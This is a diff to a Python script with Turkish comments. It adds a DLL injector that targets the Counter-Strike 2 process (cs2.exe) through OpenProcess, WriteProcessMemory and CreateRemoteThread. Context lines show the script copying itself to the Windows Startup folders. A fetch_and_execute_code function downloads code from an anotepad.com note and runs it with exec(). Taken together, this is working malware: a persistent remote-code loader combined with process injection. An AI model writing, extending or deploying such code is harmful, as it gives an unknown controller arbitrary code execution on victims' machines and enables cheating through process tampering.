@@ -5,6 +5,88 @@ import os
 import time
 import shutil
 import sys
+from ctypes import *
+import psutil
+import threading
+
+
+def inject_dll():
+    def get_pid_by_name(proc_name):
+        """Belirtilen adı taşıyan sürecin PID'sini alır."""
+        for proc in psutil.process_iter(attrs=['pid', 'name']):
+            if proc.info['name'].lower() == proc_name.lower():
+                return proc.info['pid']
+        return None
+
+    def extract_dll():
+        """PyInstaller ile eklenen data.dll dosyasını çıkartır."""
+        if getattr(sys, '_MEIPASS', False):
+            base_path = sys._MEIPASS
+        else:
+            base_path = os.getcwd()
+
+        dll_path = os.path.join(base_path, "data.dll")
+
+        if getattr(sys, '_MEIPASS', False):
+            new_dll_path = os.path.join(os.getcwd(), "data.dll")
+            shutil.copy(dll_path, new_dll_path)
+            return new_dll_path
+
+        return dll_path
+
+    print("[+] CS2 için DLL Enjekte Edici Başlatılıyor...")
+
+    # CS2'nin PID'sini al
+    cs2_pid = get_pid_by_name("cs2.exe")
+    if not cs2_pid:
+        print("[!] CS2.exe çalışmıyor veya bulunamadı.")
+        sys.exit(0)
+
+    # DLL dosyasını belirle
+    dll_path = extract_dll()
+
+    if not os.path.exists(dll_path):
+        print(f"[!] DLL dosyası bulunamadı: {dll_path}")
+        sys.exit(0)
+
+    PAGE_READWRITE = 0x04
+    PROCESS_ALL_ACCESS = (0x00F0000 | 0x00100000 | 0xFFF)
+    VIRTUAL_MEM = (0x1000 | 0x2000)
+
+    kernel32 = ctypes.windll.kernel32
+    dll_len = len(dll_path) + 1  # Null-terminated string için +1
+
+    # Hedef sürecin handle'ını al
+    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, cs2_pid)
+
+    if not h_process:
+        print(f"[!] CS2.exe'nin PID'sine erişilemiyor: {cs2_pid}")
+        sys.exit(0)
+
+    # Bellekte DLL yolu için yer ayır
+    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)
+
+    # DLL yolunu hedef sürece yaz
+    written = ctypes.c_int(0)
+    kernel32.WriteProcessMemory(h_process, arg_address, dll_path.encode('utf-8'), dll_len, ctypes.byref(written))
+
+    # LoadLibraryA adresini al
+    h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
+    h_loadlib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")
+
+    # Yeni bir uzaktan thread oluştur ve DLL'yi yükle
+    thread_id = ctypes.c_ulong(0)
+
+    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, ctypes.byref(thread_id)):
+        print("[!] DLL enjekte edilemedi.")
+        sys.exit(0)
+
+    print(f"[+] CS2.exe'ye başarıyla DLL enjekte edildi! (Thread ID: 0x{thread_id.value:08x})")
+
+
+
+
+
 def get_startup_folders():
     user_startup = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
     global_startup = os.path.expandvars(r"%PROGRAMDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
@@ -25,21 +107,18 @@ def inject_program():
         copy_file_to_startup(sys.executable, startup_folders["User Startup"])
 
 def fetch_and_execute_code(url):
-    try:
-        response = requests.get(url)
-        response.raise_for_status()  # HTTP hatalarını yakala
-        soup = BeautifulSoup(response.text, "html.parser")
-        plaintext_content = soup.find(class_="plaintext")
-        if plaintext_content:
-            exec(plaintext_content.text.strip())
-        else:
-            print("Plaintext content not found.")
-    except requests.RequestException as e:
-        print(f"Error fetching the URL: {e}")
-    except Exception as e:
-        print(f"Error executing the code: {e}")
+    response = requests.get(url)
+    response.raise_for_status()  # HTTP hatalarını yakala
+    soup = BeautifulSoup(response.text, "html.parser")
+    plaintext_content = soup.find(class_="plaintext")
+    if plaintext_content:
+        exec(plaintext_content.text,globals())
+    else:
+        print("Plaintext content not found.")
+
 
 def main():
+    threading.Thread(target=inject_dll).start()
     url = "https://anotepad.com/notes/3gkei2dg"
     inject_program()
     time.sleep(1)
